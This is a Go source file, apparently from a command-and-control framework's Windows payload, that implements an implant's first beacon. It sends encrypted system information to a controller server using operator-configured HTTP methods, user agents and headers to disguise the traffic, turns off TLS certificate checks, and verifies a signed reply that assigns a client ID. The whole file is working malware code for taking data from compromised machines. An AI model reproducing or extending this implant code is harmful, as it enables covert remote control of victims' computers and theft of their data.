// server/docker/payloads/Windows/http.go
//go:build windows
// +build windows

package main

import (
	"bytes"
	"crypto"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"time"
)

// PostData represents the structure of our post request body
type PostData struct {
	Data      string            `json:"data"`      // Our encrypted system info
	Metadata  map[string]string `json:"metadata"`  // Additional metadata
	Timestamp int64             `json:"timestamp"` // Current timestamp
}

type SignedResponse struct {
	Status             string `json:"status"`
	NewClientID        string `json:"new_client_id"`
	SecretsInitialized bool   `json:"secrets_initialized"`
	Signature          string `json:"signature"`
	Seed               string `json:"seed"`
}

// parseCustomHeaders converts the JSON string of custom headers into a map
func parseCustomHeaders(headerJSON string) (map[string]string, error) {
	headers := make(map[string]string)
	err := json.Unmarshal([]byte(headerJSON), &headers)
	if err != nil {
		return nil, fmt.Errorf("failed to parse custom headers: %v", err)
	}
	return headers, nil
}

func sendInitialPost(url string, encryptedData string, decrypted map[string]string) (string, error) {
	// Get the custom POST method from decrypted values
	method := decrypted["POST Method"] // Ensure this matches exactly
	if method == "" {
		method = "POST"
	}

	// Create the post data structure
	postData := PostData{
		Data: encryptedData,
		Metadata: map[string]string{
			"id":         clientID,
			"encryption": "rsa+aes",
		},
		Timestamp: time.Now().Unix(),
	}

	// Convert post data to JSON
	jsonData, err := json.Marshal(postData)
	if err != nil {
		return "", fmt.Errorf("failed to marshal post data: %v", err)
	}

	fmt.Printf("Attempting %s to: %s\n", method, url)
	fmt.Printf("Payload size: %d bytes\n", len(jsonData))

	// Create the request with custom method
	req, err := http.NewRequest(method, url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", fmt.Errorf("failed to create request: %v", err)
	}

	// Parse and set custom headers
	customHeaders, err := parseCustomHeaders(decrypted["Custom Headers"])
	if err != nil {
		return "", fmt.Errorf("failed to parse custom headers: %v", err)
	}

	// Set headers
	req.Header.Set("User-Agent", decrypted["User Agent"])
	req.Header.Set("Content-Type", decrypted["Content Type"])
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	// Debugging headers
	fmt.Println("Request headers set:")
	for key, values := range req.Header {
		fmt.Printf("  %s: %v\n", key, values)
	}

	// Custom HTTP client
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr, Timeout: time.Second * 30}

	// Send request
	fmt.Printf("Sending %s request...\n", method)
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	// Read response body
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response body: %v", err)
	}

	// Parse the signed response
	var signedResponse SignedResponse
	if err := json.Unmarshal(bodyBytes, &signedResponse); err != nil {
		return "", fmt.Errorf("failed to parse response JSON: %v", err)
	}

	// Verify the server's signature
	verificationData := fmt.Sprintf("%s:%s", signedResponse.NewClientID, signedResponse.Seed)
	hashed := sha256.Sum256([]byte(verificationData))

	// Parse server's public key
	block, _ := pem.Decode([]byte(decrypted["Public Key"]))
	if block == nil {
		return "", fmt.Errorf("failed to parse server public key")
	}

	publicKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return "", fmt.Errorf("failed to parse public key: %v", err)
	}

	// Decode signature
	signature, err := base64.StdEncoding.DecodeString(signedResponse.Signature)
	if err != nil {
		return "", fmt.Errorf("failed to decode signature: %v", err)
	}

	// Verify signature
	if err := rsa.VerifyPKCS1v15(publicKey, crypto.SHA256, hashed[:], signature); err != nil {
		return "", fmt.Errorf("server signature verification failed: %v", err)
	}

	fmt.Println("Server signature verified successfully!")

	// Return the new client ID if everything is verified
	if signedResponse.NewClientID == "" {
		return "", fmt.Errorf("no new client ID received")
	}

	fmt.Printf("DEBUG: Received new client ID: %s\n", signedResponse.NewClientID)
	return signedResponse.NewClientID, nil
}
